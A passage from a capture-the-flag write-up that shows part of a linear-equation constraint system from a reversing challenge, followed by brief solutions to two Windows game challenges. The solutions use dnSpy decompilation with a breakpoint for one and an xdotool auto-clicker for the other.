x[0xb] * -8 + x[0x1b] * -7 + x[0x1a] * -9 + x[0x18] * -9 + x[9] * -10 + x[2] * -6 + x[0x22] * 4 + x[0x1f] * -8 + x[7] * 3 + x[0] * 4 + x[0x13] * -4 - x[0x12] + x[0x15] * 5 + x[0xd] * 3 + x[1] * 10 + x[0x16] * -4 + x[0x1e] * 4 + x[8] * -10 + x[0x11] * 10 + x[5] * 6 + x[0x17] * 7 + x[0x14] * -2 + x[0xe] * 3 + x[0x10] * 10 - x[0x20] + x[0x1d] * 4 + x[0x1c] * -9 + x[0xf] + x[0x23] * 8 + x[6] * 2 + x[0xc] * -3 + x[0x19] * -5 + x[10] * -2 + x[4] * -5 + x[3] * 6 + x[0x21] == -0x8e7 ,
x[0xf] * 7 + x[0x1b] * -8 + x[0xe] * 8 - x[2] * 4 + x[4] * 2 + x[0] * 10 + x[0x1a] * 2 + x[8] * 8 - x[0x23] + x[0x1d] * 7 + x[0x17] * 5 + x[0x14] * -5 + x[0x1f] * 6 + x[0x15] * 5 + x[6] * -7 + x[0xb] * 10 + x[0x16] * -2 + x[5] * -6 + x[0x20] * -10 + x[0x19] * -7 + x[0x21] * -7 + x[0x22] - x[0xd] + x[0xc] * -4 + x[7] * 2 + x[0x10] * 5 + x[3] * 3 + x[9] * -10 + x[0x18] * 3 + x[10] * 4 + x[0x1c] * 5 == 0x14c ,
x[0x10] * 9 + x[0xb] * -6 + x[8] * -10 + x[7] * -6 + x[0x15] * -6 + x[0x13] * -2 + x[0] * 9 + x[9] * -9 + x[1] * 4 - x[0x1f] + x[0x18] * -4 + x[0x1d] * 3 + x[0x1a] * 2 + x[0x20] * -6 + x[0x11] * 4 + x[0x23] * -9 + x[0x22] * 6 + x[0x1e] * -9 + x[10] * -3 + x[0x1b] * -3 - x[0x17] + x[4] * 6 + x[6] * -8 + x[2] * -9 + x[0x19] * -2 + x[0x1c] * -9 + x[0x16] * 5 + x[0x12] * 8 + x[0x14] * -8 + x[0xd] * -4 + x[0xf] * 7 + x[3] * -4 - x[0xc] == -0x143c ,
x[5] * -2 + x[8] * -7 + x[0x20] * -5 + x[0x22] * 3 + x[1] * -6 + x[0xe] * -8 + x[0x17] + x[0x18] * -10 + x[0x1c] * -8 + x[0xc] * -7 + x[0x1d] * -5 + x[0x11] * 8 + x[0x15] * 8 + x[6] * 8 + x[10] * -3 + x[0x1b] * 10 + x[0xb] * 8 + x[2] * 6 + x[0x1a] * -6 + x[0x19] * -10 + x[0x14] + x[0xf] * -9 + x[3] * -7 + x[0xd] * 3 - x[0x21] + x[0x12] * -8 + x[0x1e] * 10 + x[7] * 2 + x[4] * 8 + x[9] * 2 + x[0x1f] * -7 + x[0x16] * -3 + x[0x13] * 6 + x[0x23] * -2 + x[0] * 9 + x[0x10] * -4 == -0xe93 ,
x[0x23] * -4 + x[0x21] * -2 + x[0x13] * -5 + x[0] * 5 + x[5] * -6 + x[7] * -7 + x[10] * 10 + x[3] * 6 + x[2] * 7 + x[0xc] * -7 + x[0x18] * 7 + x[0x12] + x[0x1b] * -5 + x[0x1a] * -3 + x[0xe] * -10 + x[1] * -9 + x[0x17] * 6 + x[0x15] * -8 + x[0x1c] * -10 + x[0x20] + x[0xb] * -5 + x[6] * 8 + x[0xd] * 2 + x[0x1e] * 7 + x[0x16] * -5 + x[0x22] * 6 + x[0xf] * -6 + x[0x1d] * 10 + x[0x1f] * 9 + x[0x14] * 6 + x[8] * -4 + x[0x19] * 3 + x[0x11] * 8 + x[0x10] * 4 == 0x1c0 ,
x[5] * 3 + x[8] * -10 + x[0] * 6 + x[0x15] * -5 + x[3] * 2 + x[0xb] * 6 + x[9] * 5 + x[0x1f] * -5 + x[0x19] * 9 + x[0x1c] * 8 + x[1] * 3 + x[0x21] * 9 + x[0xc] * 7 + x[0x10] * 8 + x[0xd] * -5 + x[0x1e] * -3 + x[2] * -6 + x[0x16] * 10 + x[0x17] + x[0x12] * -9 + x[0x20] * 9 + x[0x1d] * -6 + x[6] * -10 + x[0x23] * -10 + x[10] * -8 + x[4] * -2 + x[0x13] * -4 + x[0xe] * -10 + x[0x14] * -8 + x[0x1b] * 5 + x[0xf] * 8 + x[0x11] * -7 == -0x14 ,
x[0x1b] * 10 + x[0x22] * 6 + x[6] * -6 + x[0xd] * 2 + x[0] * 4 + x[0x20] * -2 + x[0x13] * 6 - x[0x15] + x[0x21] * -2 + x[9] + x[0xb] * -8 + x[0x1d] * -9 + x[4] * -3 + x[7] * -5 + x[0x18] * -6 + x[10] * -9 + x[0x1f] + x[0x11] * -9 + x[0x1e] * 3 + x[0x16] * 9 + x[0x10] * -10 + x[0x12] * -9 - x[3] + x[0x23] * 7 - x[0xf] - x[0x1a]  + x[0x17] * 8 + x[0x19] * 3 + x[0x14] * -2 - x[2] + x[0xc] * 10 == -0x67 ,
x[1] * 10 + x[0x16] * -10 + x[0xb] * 8 + x[5] * -6 + x[0x1d] * -10 + x[0xd] * -10 + x[4] * 3 + x[7] * -4 + x[0x14] * 10 + x[0x23] * -8 + x[0x21] * 8 + x[0x20] - x[3] + x[0x11] * 2 + x[9] * 7 + x[2] * 9 + x[10] * 8 + x[0xe] + x[0x1a] * -8 + x[6] * -8 + x[0x15] + x[0xc] * 6 + x[0xf] * -6 + x[0x13] * 6 + x[0x1f] * 2 + x[0x19] * 8 + x[0x19] + x[8] * 8 + x[8] + x[0x22] * -8 + x[0] * -3 - x[0x12] == 0x9a1 ,
x[0x22] * 5 + x[4] * -3 + x[0x15] * -8 + x[0x18] * 9 + x[0x20] + x[6] * -5 - x[0x11] + x[0x10] * 9 + x[0x17] * -7 + x[0x1d] * 5 + x[0x12] + x[7] * 4 + x[1] * -7 + x[9] * 3 + x[10] * 4 + x[0x13] * -5 + x[0x1a] * -10 + x[0x1e] * 7 + x[0x1f] * -7 + x[0xb] + x[0x23] * 5 + x[5] * 6 + x[0xd] * -2 + x[0xf] * -9 + x[0] * -9 + x[8] * -4 + x[3] * 9 + x[0x1c] * 6 + x[0x14] * 3 + x[0x16] * -6 + x[0x19] * 4 + x[0x1b] * -9 + x[0x21] * 9 + x[0xe] + x[0xc] * 8 + x[2] * -6 == 0x227 ,
x[0x11] * -10 + x[0x18] * 8 - x[2] + x[0xd] * 7 + x[4] * -4 + x[0x10] * 10 + x[8] * -8 + x[5] * -3 + x[0x20] * -2 + x[0x16] * 7 + x[0x1e] * 9 - x[0xc] + x[0] * 6 + x[0x15] * -8 + x[7] * 7 + x[0x1c] * 4 + x[6] * 8 + x[9] * 4 + x[0x12] * 8 + x[0x1b] * 8 + x[0x22] * 4 + x[0x14] * 10 + x[0x17] * -6 + x[0x13] * 6 + x[0x21] * 10 + x[0x1a] * 8 + x[10] * 3 + x[0xf] * -4 + x[3] * -8 + x[0x1f] * -8 + x[0x1d] * 7 + x[0xb] * 7 + x[1] * 5 + x[0x19] * 8 + x[0x23] * 2 + x[0x23] == 0x1ebc ,
x[0x1c] * 7 + x[0x1d] * -10 - x[0x12] + x[0x1a] * -9 + x[3] * 4 + x[0x14] * 5 + x[0x16] * 2 + x[5] * 7 + x[7] * -6 + x[0x10] * -10 + x[0x1b] * -4 + x[0x22] * 4 + x[0x1e] + x[0x20] + x[0xd] * 4 + x[10] * -2 + x[0x19] * -2 + x[0x15] * 8 + x[0x11] * -3 + x[0x21] * -6 + x[9] * 5 + x[1] * -6 + x[8] * 8 + x[0xb] * 6 + x[0] * -7 + x[0xc] * -8 + x[6] * 2 + x[6] + x[2] * -5 + x[2] * -5 + x[0x18] * -4 + x[0xe] * -10 + x[4] * 6 + x[0x13] * -7 + x[0x1f] * -9 - x[0xf] == -0x12bc ,
x[0xc] + x[0x10] * 6 + x[0] * -3 - x[2] + x[0x19] * 8 - x[0xd] + x[0x18] * 3 + x[0xe] - x[10] + x[0xb] * 2 + x[0x11] * 3 + x[0x1d] * -6 + x[0x14] * -5 + x[1] * 3 + x[0x22] * -3 + x[0x13] * -5 + x[0x12] * -4 + x[0x21] * 2 + x[3] * 6 + x[0x1c] * -2 + x[0x1a] * 4 + x[0x1b] * 2 + x[0x1f] + x[0xf] * -2 + x[0x16] * 3 + x[5] * 10 + x[0x17] * -10 + x[7] * -3 + x[0x20] * 8 + x[4] * -2 + x[0x23] * 3 + x[6] * -3 + x[0x15] * 8 + x[0x1e] * -8 - x[8] == 0x339 ,
x[9] * 8 + x[0x11] * 2 + x[0x22] * 4 + x[0x20] * -5 + x[0xb] * 7 + x[0x1b] * 7 + x[0xc] * 3 + x[0x15] * 6 + x[0x1e] * 2 + x[1] * 6 + x[0x16] * -4 + x[0x1d] * -3 + x[5] * -2 + x[0x17] * 5 + x[0x13] + x[2] * -5 + x[8] * 3 + x[3] * 3 + x[0x1f] * 4 + x[10] * -8 + x[0x12] * -8 + x[0x10] * 8 + x[0x19] * 7 + x[0x21] * -9 + x[0x18] * 3 + x[0xe] * -5 + x[0x23] * 9 + x[0x1c] * -10 + x[0x1a] * -10 + x[0x14] * 3 + x[0] * 2 + x[0] + x[0xf] * 8 + x[7] * 4 + x[7] - x[0xd] == 0xdb2 ,
x[2] * 7 + x[0x1f] * 5 - x[0x1e] + x[6] * -7 + x[0x19] * -3 + x[0xf] * 4 + x[0x12] * -6 + x[0x10] * 10 + x[0x13] * -10 - x[0xb] + x[0x17] + x[8] * -4 + x[0x22] * 9 + x[0x20] * 7 + x[0x18] * -9 + x[0xc] * 4 + x[0x16] * 6 + x[3] * -8 + x[0x1a] * 9 + x[0xd] * 5 + x[9] * -4 + x[1] * -7 + x[0] * 8 + x[0x15] * 4 + x[0x1b] * -3 + x[0x14] * -8 + x[10] * 7 + x[0x23] * 8 + x[4] * -4 + x[0x1d] * 2 + x[0x21] * -10 + x[7] * 8 + x[0xe] * -5 + x[5] * -10 == -0x32f ,
x[0x12] * 6 + x[0x1b] * -7 + x[0x18] * 10 + x[0xe] * 10 + x[2] * 8 + x[8] * -2 + x[0xb] * 6 + x[0xc] * 10 + x[0x16] * -6 + x[0x15] * 8 + x[0x1d] * 3 + x[0x10] * -7 + x[0xd] + x[0x23] * -7 + x[0x21] * -10 + x[0x22] * 6 + x[5] * 8 + x[0x1f] * 2 + x[9] * -7 + x[0x14] * -10 + x[0x1a] * -2 + x[0x19] * 6 + x[0x1e] * 10 + x[0x11] * 7 + x[1] * -5 + x[4] * -2 + x[0x17] * 9 + x[0xf] * -7 + x[0x13] * -10 + x[10] * 6 + x[7] * -8 + x[0] * -10 + x[3] * 8 + x[0x1c] * 9 + x[0x20] == 0x4b1 ,
x[0x20] * -5 + x[8] * 9 + x[0x1e] * 3 + x[0x15] * -8 - x[10] + x[1] * 7 + x[0x21] * -3 + x[9] * -3 + x[0xf] * 10 + x[0x10] * -5 + x[7] + x[0x23] * 7 + x[0x1a] + x[4] + x[3] * -7 + x[0x11] * -8 + x[0x19] * 2 - x[2] + x[0xe] * 7 + x[0xb] * -10 + x[0xc] * -2 + x[0] * 7 + x[0x1d] * -4 + x[0x18] * 8 + x[0x22] * -8 + x[0x17] + x[0x1f] * -6 + x[0xd] * 7 + x[0x1c] * -3 + x[0x14] * 6 + x[0x12] * -3 + x[0x13] * -4 + x[0x16] * 4 + x[5] * -3 == 0x224 ,
x[4] * -4 + x[0] + x[0x1e] * -2 + x[0xb] * -8 + x[0x1d] * -2 + x[0x1b] * 5 + x[7] * 7 + x[0x22] * -5 + x[9] * 8 + x[0x14] + x[8] * 6 + x[2] * -10 + x[0x1c] * 3 + x[0x16] * -8 + x[0x15] * 10 + x[1] * 7 + x[0x20] * -3 + x[0xe] * 8 + x[3] * 4 + x[10] * 2 + x[5] * -6 + x[0x19] * 6 - x[0x12] + x[0xd] * 5 + x[6] * -9 + x[0x10] * 4 + x[0xc] * -4 + x[0xf] * 10 + x[0x1a] * -9 + x[0x18] * -5 + x[0x23] * 8 + x[0x23] + x[0x13] + x[0x17] * 8 + x[0x11] * 4 + x[0x21] * -6 == 0xdf8 ,
x[0xb] * -9 + x[1] * 6 + x[0x14] * 10 + x[8] * 8 + x[5] * -5 + x[4] * 8 + x[0x1f] * 6 + x[0x21] * -3 + x[0x1d] * 8 + x[0x18] * 6 + x[0x10] * -4 + x[0x16] * 10 + x[2] * -5 + x[0x15] * 5 + x[0xf] * 8 + x[6] * 3 + x[0xd] * -3 + x[0xe] * -8 + x[7] * -10 + x[10] * -6 + x[9] * -6 + x[0xc] * -10 + x[0] * -9 + x[0x17] * 9 + x[3] * 6 + x[0x20] * 7 + x[0x1b] * -10 + x[0x1c] * 3 + x[0x1a] + x[0x22] * -9 + x[0x23] * 6 + x[0x19] * -8 + x[0x13] * -5 + x[0x12] * -5 + x[0x11] * -4 == 0x100 ,
x[6] * -3 + x[0x11] * 3 + x[0x20] * -2 + x[10] * -5 + x[0x16] * 6 + x[7] * -8 + x[1] * 6 - x[0xc] + x[0x1b] * 8 + x[0xf] * -7 + x[0x19] * 7 + x[0x13] * -4 + x[5] * 10 + x[0x22] * -7 + x[0xd] * 8 + x[4] + x[8] * 8 + x[0x1e] * -5 + x[0] + x[0x15] * 7 - x[0x1a] + x[3] * 10 + x[0x17] * 6 + x[0x12] * -5 + x[0xb] * 10 + x[2] * -3 + x[0x23] * -7 + x[0x10] * -6 + x[0xe] * 2 + x[0x1f] * -5 + x[0x1d] * -3 + x[0x1c] * 5 + x[0x21] * -4 + x[9] + x[0x18] * -3 == 0x342 ,
x[0xc] * -7 + x[0x1f] * 2 + x[7] * 9 + x[6] * 3 + x[0x13] * -5 + x[0x20] * 2 + x[0xf] * -9 + x[0x1a] * 8 + x[4] * -7 + x[0x19] * 6 + x[1] * -5 + x[0x1d] * 8 + x[0x16] * 7 + x[0x12] * -7 + x[0x14] * -6 + x[0x21] * 6 + x[0x10] * 8 + x[0x1c] * 10 + x[0xd] * 10 + x[0x11] * 5 - x[0x18] + x[2] * 3 + x[5] * 2 + x[8] * 7 + x[0x23] * -6 + x[9] * -10 + x[0xb] * -3 + x[10] * 5 + x[0x15] * 3 + x[0x1e] * 7 + x[0x17] * 2 + x[3] * -8 == 0x553 ,
x[0x21] * -9 + x[0x20] * 6 - x[0x10] - x[0x12] + x[1] * 8 + x[10] * 4 + x[0x11] * -6 + x[0x13] * 8 + x[9] * -8 + x[0x1a] * 9 - x[8] + x[0] * 9 + x[0xd] * 4 + x[0x1f] * -2 + x[0x1d] * -4 + x[6] * 8 + x[0x23] * 6 + x[0x17] * 10 + x[0xb] * 3 + x[0x14] * -7 + x[0x1c] * -3 + x[0x1e] * 10 - x[0xc] + x[3] * -10 - x[0x18] + x[2] * -2 + x[5] * -3 - x[0xe] + x[0x22] * -5 + x[0x19] * -9 + x[0x16] * 4 + x[0x15] * -2 + x[0x1b] * -7 + x[7] * 10 == -0x219  , 
x[2] * 7 + x[0x1a] * -10 + x[0xb] * 7 + x[0x14] * 10 + x[9] * 7 + x[0xd] * -6 + x[6] * 3 + x[0x1d] * 5 + x[0x20] * 2 + x[0] * 6 + x[0x19] * -9 + x[0x18] * -6 + x[0xf] * 7 + x[0x12] * 8 + x[0x1c] * -10 + x[0x15] * -7 + x[0xc] + x[0x1e] * -9 + x[0x17] * -8 + x[0x1b] * -3 + x[0x23] * 8 + x[8] * 6 + x[1] * -4 + x[7] * -8 + x[0x21] * 8 + x[0x16] * -3 + x[10] * -2 + x[0xe] * 9 + x[0x13] * 4 + x[5] * 3 + x[0x1f] * -7 + x[3] * -7 + x[0x10] * 2 + x[0x11] * 5 == 0x995 ,
x[5] * 2 + x[2] * 10 + x[0x22] * -5 + x[0] * -5 + x[7] * 8 - x[7] + x[1] * -6 - x[0xf] + x[0x15] * 4 + x[0x12] * -9 + x[6] * -9 + x[0x10] * 2 + x[0x17] * -8 + x[0x13] * 4 + x[8] * 7 + x[0x11] * 7 + x[0xb] * 7 + x[10] * 6 + x[0x18] * -9 + x[0xc] * -10 - x[9] + x[0x20] * -2 + x[0x23] + x[0x1e] * -6 + x[0xe] * -7 + x[0x1f] * -7 + x[4] * 9 + x[0x1a] * 10 + x[3] * -9 + x[0x19] * 8 - x[0x14] == -0x756 ,
x[10] * 5 + x[0x1e] * -8 + x[9] * 7 + x[0x1b] * -4 + x[0x12] + x[0x14] + x[0x1a] * 4 + x[8] * 9 - x[0x18] + x[7] * -10 + x[0x23] * 5 - x[0x15] + x[0x21] * 3 + x[0x1f] * -6 + x[0x1d] * 3 + x[3] * -5 - x[0x22] + x[2] * -3 + x[0xb] * -10 + x[4] * -9 + x[0xd] * 5 + x[0xc] * 6 + x[0xf] * 10 + x[0x10] * -3 - x[0x11] + x[0] + x[0x13] * -10 - x[1] + x[0x19] * 4 + x[5] * 9 + x[0x16] * 4 + x[0x1c] + x[0x20] * 3 + x[0xe] * -7 + x[6] * 3 == 0x4c4 ,
x[6] * 4 + x[0x12] * -6 + x[1] * -5 + x[0] * -6 + x[4] * -4 + x[0x1b] * 4 + x[9] * 2 + x[8] * -3 + x[0x1e] * -7 + x[7] * 8 + x[0x23] * 4 + x[0x15] * -10 + x[0x22] * -3 + x[0x1d] * 9 + x[0xe] * 2 + x[0x13] * 2 + x[0x17] * -8 + x[0xf] * 9 + x[10] * -2 + x[0x1a] * -10 + x[2] * -3 + x[0xd] * 6 + x[5] * 4 + x[0x20] * -7 - x[0x1f] + x[3] * -9 - x[0x1c] + x[0x11] * 7 + x[0x10] * 4 + x[0xb] * 7 + x[0x16] * -9 + x[0x21] * -6 + x[0x19] * -10 == -0xa22)
```

**==>** **<==**

### LuckyMine (200pts)

```
This game should be easy to you, right ?

File: LuckyMine.exe
```

On Windows, use [dnSpy](https://github.com/0xd4d/dnSpy) to turn the executable into source code (in .NET). You can read the source and make modifications to enter the Win function early on. For me, I just put a break on the mine planting function to find the 5 safe squares and click them.

**==>** **<==**

### PatientRevenge (250pts)

```
How about 1000 mouses this time? LOL

File: PatientRevenge.exe
```

On Ubuntu 18.04, install `xdotool`, run `xdotool click --delay 1 --repeat 110000 1` (auto left click every 1ms for 110000 clicks), and move the cursor to the Click button. Be careful when moving the cursor since you are basically clicking every 1ms, I crashed my laptop twice for this.

**==>** **<==**
